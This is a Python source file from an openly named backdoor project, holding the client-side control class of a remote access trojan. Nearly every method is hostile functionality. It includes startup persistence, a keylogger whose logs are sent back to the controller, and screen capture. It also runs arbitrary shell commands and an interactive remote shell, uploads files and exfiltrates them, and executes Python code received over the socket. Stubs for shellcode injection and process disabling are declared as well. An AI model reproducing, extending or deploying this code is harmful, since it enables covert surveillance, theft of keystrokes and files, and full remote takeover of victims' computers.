"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import abc
import os
import subprocess
import sys
from io import BytesIO, StringIO

from PIL import Image

from src import helper, errors
from src.definitions import platforms

if platforms.OS == platforms.LINUX:
    import Xlib

if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
    from src.client.persistence.unix import Unix as Persistence
else:
    import pyscreeze
    from src.client.persistence.windows import Windows as Persistence

from src.definitions.commands import *
from src.client.keylogger import Keylogger


# abstract methods are the ones not cross compatible


class Control(metaclass=abc.ABCMeta):
    def __init__(self, _socket):
        self.socket = _socket
        self.keylogger = Keylogger()
        self.disabled_processes = {}

    @abc.abstractmethod
    def get_info(self):
        pass

    @abc.abstractmethod
    def inject_shellcode(self, buffer):
        pass

    @abc.abstractmethod
    def toggle_disable_process(self, process, popup):
        pass

    @abc.abstractmethod
    def lock(self):
        pass

    def add_startup(self, remove=False):
        p = Persistence()

        try:
            if remove:
                p.remove_from_startup()
            else:
                p.add_startup()

            self.socket.send_json(SUCCESS)
        except errors.ClientSocket.Persistence.StartupError as e:
            self.socket.send_json(ERROR, str(e))
        except NotImplemented:
            self.socket.send(ERROR, "Command not supported")

    def heartbeat(self):
        self.socket.send_json(SUCCESS)

    def close(self):
        self.socket.close()
        sys.exit(0)

    def keylogger_dump(self):
        try:
            self.socket.sendall_json(SUCCESS, helper.decode(self.keylogger.dump_logs().encode()))
        except errors.ClientSocket.KeyloggerError as e:
            self.socket.send_json(ERROR, str(e))

    def keylogger_start(self):
        self.keylogger.start()

    def keylogger_stop(self):
        try:
            self.keylogger.stop()
            self.socket.send_json(SUCCESS)
        except errors.ClientSocket.KeyloggerError as e:
            self.socket.send_json(ERROR, str(e))

    def screenshot(self):
        if platforms.OS == platforms.LINUX:
            try:
                dsp = Xlib.display.Display()

                root = dsp.screen().root
                desktop = root.get_geometry()
                w = desktop.width
                h = desktop.height

                raw_byt = root.get_image(0, 0, w, h, Xlib.X.ZPixmap, 0xffffffff)
                image = Image.frombuffer("RGB", (w, h), raw_byt.data, "raw", "BGRX")

                dsp.close()
            except:
                self.socket.send(ERROR)
                return
        else:
            image = pyscreeze.screenshot()

        with BytesIO() as _bytes:
            image.save(_bytes, format="PNG")
            image_bytes = _bytes.getvalue()

        self.socket.sendall_json(SERVER_SCREENSHOT, image_bytes, len(image_bytes), is_bytes=True)

    def run_command(self, command):
        _command = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                    shell=True)
        output = _command.stdout.read() + _command.stderr.read()

        self.socket.sendall_json(SUCCESS, helper.decode(output))

    def command_shell(self):
        orig_dir = os.getcwd()

        self.socket.send_json(SERVER_SHELL_DIR, orig_dir)

        while True:
            data = self.socket.recv_json()

            if data["key"] == CLIENT_SHELL_CMD:
                command_request = data["value"]

                # check for windows chdir
                if platforms.OS == platforms.WINDOWS and command_request[:5].lower() == "chdir":
                    command_request = command_request.replace("chdir", "cd", 1)

                if command_request[:3].lower() == "cd ":
                    cwd = ' '.join(command_request.split(" ")[1:])

                    try:
                        command = subprocess.Popen('cd' if platforms.OS == platforms.WINDOWS else 'pwd', cwd=cwd,
                                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                   stdin=subprocess.PIPE, shell=True)
                    except FileNotFoundError as e:
                        self.socket.sendall_json(SERVER_COMMAND_RSP, str(e))
                    else:
                        if command.stderr.read().decode() == "":  # if there is no error
                            output = (command.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                            os.chdir(output)  # change directory

                            self.socket.send_json(SERVER_SHELL_DIR, os.getcwd())
                        else:
                            self.socket.send_json(SERVER_COMMAND_RSP, helper.decode(command.stderr.read()))
                else:
                    command = subprocess.Popen(command_request, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE,
                                               shell=True)
                    output = command.stdout.read() + command.stderr.read()

                    self.socket.sendall_json(SERVER_COMMAND_RSP, helper.decode(output))

            elif data["key"] == CLIENT_SHELL_LEAVE:
                os.chdir(orig_dir)  # change directory back to original
                break

    def upload(self, buffer, file_path):
        output = self.socket.recvall(buffer)

        try:
            with open(file_path, "wb") as file:
                file.write(output)

            self.socket.send_json(SUCCESS, f"Total bytes received by client: {len(output)}")
        except Exception as e:
            self.socket.send_json(ERROR, f"Could not open file {e}")

    def receive(self, file):
        try:
            with open(file, "rb") as _file:
                data = _file.read()

            self.socket.sendall_json(SERVER_FILE_RECV, data, len(data), is_bytes=True)
        except Exception as e:
            self.socket.send_json(ERROR, f"Error reading file {e}")

    def python_interpreter(self):
        while True:
            command = self.socket.recv_json()

            if command["key"] == CLIENT_PYTHON_INTERPRETER_CMD:
                old_stdout = sys.stdout
                redirected_output = sys.stdout = StringIO()

                try:
                    exec(command["value"])
                    print()
                    error = None
                except Exception as e:
                    error = f"{e.__class__.__name__}: "
                    try:
                        error += f"{e.args[0]}"
                    except Exception:
                        pass
                finally:
                    sys.stdout = old_stdout

                if error:
                    self.socket.sendall_json(SERVER_PYTHON_INTERPRETER_RSP, helper.decode(error.encode()))
                else:
                    self.socket.sendall_json(SERVER_PYTHON_INTERPRETER_RSP,
                                             helper.decode(redirected_output.getvalue().encode()))
            elif command["key"] == CLIENT_PYTHON_INTERPRETER_LEAVE:
                break
